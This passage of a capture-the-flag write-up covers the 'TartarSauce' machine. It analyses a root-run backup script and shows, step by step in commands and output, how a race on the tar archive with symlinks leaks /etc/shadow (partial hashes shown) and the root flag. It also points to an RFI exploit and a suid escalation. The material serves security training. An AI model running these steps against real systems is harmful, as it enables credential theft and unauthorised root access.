2021/11/20 10:19:41 CMD: UID=0    PID=19597  | /usr/bin/sudo -u onuma /bin/tar -zcvf /var/tmp/.39809238939f73dc2186a8a77dc126804092cab5 /var/www/html
2021/11/20 10:19:41 CMD: UID=1000 PID=19601  | /bin/tar -zcvf /var/tmp/.39809238939f73dc2186a8a77dc126804092cab5 /var/www/html
2021/11/20 10:19:41 CMD: UID=1000 PID=19602  | gzip
2021/11/20 10:20:11 CMD: UID=0    PID=19608  | /bin/tar -zxvf /var/tmp/.39809238939f73dc2186a8a77dc126804092cab5 -C /var/tmp/check
2021/11/20 10:20:11 CMD: UID=0    PID=19607  | /bin/tar -zxvf /var/tmp/.39809238939f73dc2186a8a77dc126804092cab5 -C /var/tmp/check
2021/11/20 10:20:12 CMD: UID=0    PID=19610  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:20:12 CMD: UID=0    PID=19609  | /bin/bash /usr/sbin/backuperer
2021/11/20 10:20:12 CMD: UID=0    PID=19611  | /bin/mv /var/tmp/.39809238939f73dc2186a8a77dc126804092cab5 /var/backups/onuma-www-dev.bak
2021/11/20 10:20:12 CMD: UID=0    PID=19612  | /bin/rm -rf /var/tmp/check . ..
2021/11/20 10:20:12 CMD: UID=0    PID=19613  |
2021/11/20 10:20:12 CMD: UID=0    PID=19616  |
```

A script, _/usr/sbin/backuperer_ is run with uid 0 (root). Examing contents of the script

```
$ cat /usr/sbin/backuperer
#!/bin/bash

#-------------------------------------------------------------------------------------
# backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ
# ONUMA Dev auto backup program
# This tool will keep our webapp backed up incase another skiddie defaces us again.
# We will be able to quickly restore from a backup in seconds ;P
#-------------------------------------------------------------------------------------

# Set Vars Here
basedir=/var/www/html
bkpdir=/var/backups
tmpdir=/var/tmp
testmsg=$bkpdir/onuma_backup_test.txt
errormsg=$bkpdir/onuma_backup_error.txt
tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d' ' -f1)
check=$tmpdir/check

# formatting
printbdr()
{
    for n in $(seq 72);
    do /usr/bin/printf $"-";
    done
}
bdr=$(printbdr)

# Added a test file to let us see when the last backup was run
/usr/bin/printf $"$bdr\nAuto backup backuperer backup last ran at : $(/bin/date)\n$bdr\n" > $testmsg

# Cleanup from last time.
/bin/rm -rf $tmpdir/.* $check

# Backup onuma website dev files.
/usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir &

# Added delay to wait for backup to complete if large files get added.
/bin/sleep 30

# Test the backup integrity
integrity_chk()
{
    /usr/bin/diff -r $basedir $check$basedir
}

/bin/mkdir $check
/bin/tar -zxvf $tmpfile -C $check
if [[ $(integrity_chk) ]]
then
    # Report errors so the dev can investigate the issue.
    /usr/bin/printf $"$bdr\nIntegrity Check Error in backup last ran :  $(/bin/date)\n$bdr\n$tmpfile\n" >> $errormsg
    integrity_chk >> $errormsg
    exit 2
else
    # Clean up and save archive to the bkpdir.
    /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak
    /bin/rm -rf $check .*
    exit 0
fi
```

Script analysis
> 1) Work directories and a random temporary file name is generated
> 2) Header is printed
> 3) Test message is generated
> 4) Cleanup
> 5) Change user context to onuma and backup /var/www/html into the tempfile
> 6) Sleep 30 seconds
> 7) Create directory for integrity check
> 8) Unatar newly created file into the check directory
> 9) Execute diff to check for differences between archive and file system
> 10) If no differences cleanup and save newly created archive, backing up the old one
> 11) Otherwise log all differences to the log file

Attack
> A) under _www-data_ user create empty files under _/var/www/html_ 
```
www-data@TartarSauce:/var/www/html$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@TartarSauce:/var/www/html$ touch 1
www-data@TartarSauce:/var/www/html$ touch 2
www-data@TartarSauce:/var/www/html$
```
> B) under _onuma_ user create _var/www/html/_ structure under /var/tmp and symlink _/etc/shadow_ to _1_ and _/root/root.txt_ to _2_
```
$ cd /var/tmp
$ pwd
/var/tmp
$ id
uid=1000(onuma) gid=1000(onuma) groups=1000(onuma),24(cdrom),30(dip),46(plugdev)
$ mkdir -p var/www/html
$ cd var/www/html
$ ln -s /etc/shadow 1
$ ln -s /root/root.txt 2
$ ls -la
total 8
drwxr-xr-x 2 onuma onuma 4096 Nov 20 10:37 .
drwxr-xr-x 3 onuma onuma 4096 Nov 20 10:36 ..
lrwxrwxrwx 1 onuma onuma   11 Nov 20 10:37 1 -> /etc/shadow
lrwxrwxrwx 1 onuma onuma   14 Nov 20 10:37 2 -> /root/root.txt
```
> C)  Create tar archive in _/var/tmp_
```
$ cd /var/tmp
$ /bin/tar -zcvf a.tgz var/www/html
var/www/html/
var/www/html/1
var/www/html/2
```
> D) wait for the script to be executed and in the 30 seconds sleep copy _a.tgz_ over the temporary archive
```
$ ls -la
total 11292
drwxrwxrwt 11 root  root      4096 Nov 20 10:39 .
drwxr-xr-x 14 root  root      4096 Feb  9  2018 ..
-rw-r--r--  1 onuma onuma 11511804 Nov 20 10:39 .e21b7e8063b4e508e808ff136821ad237a787c86
-rw-r--r--  1 onuma onuma      185 Nov 20 10:39 a.tgz
...
drwxr-xr-x  3 onuma onuma     4096 Nov 20 10:36 var
$ cp a.tgz .e21b7e8063b4e508e808ff136821ad237a787c86
```
> E) wait for the check to complete
> F) check the log file _onuma_backup_error.txt_ under _/var/backups_ as it will contain differences between files _1_ and _2_ from _/var/www/html_ and a.tgz archive, i.e. contents of _/etc/shadow_ and _/root/root.txt_
```
$ cat /var/backups/onuma_backup_error.txt
...
------------------------------------------------------------------------
Integrity Check Error in backup last ran :  Sat Nov 20 10:40:21 EST 2021
------------------------------------------------------------------------
/var/tmp/.e21b7e8063b4e508e808ff136821ad237a787c86
diff -r /var/www/html/1 /var/tmp/check/var/www/html/1
0a1,31
> root:$6$AKRzYZby$Q88P1RTNm6Ho39GencM8qFL8hkhF0GmIhY.........
...
> sshd:*:17571:0:99999:7:::
> onuma:$6$P9azUgRM$U9lw7gpIvIVv1UK9zzzakd9mVwNe....
diff -r /var/www/html/2 /var/tmp/check/var/www/html/2
0a1
> e79abdab8b8a...........
```

# NB

## WordPress plugin gwolle-gb is actually version 1.5.3 and is vulnerable to RFI. Relevant EDB: 38861
## It _is_ possible to get full root access by putting suid binary in the _a.tgz_ archive and accessing it during the check phase


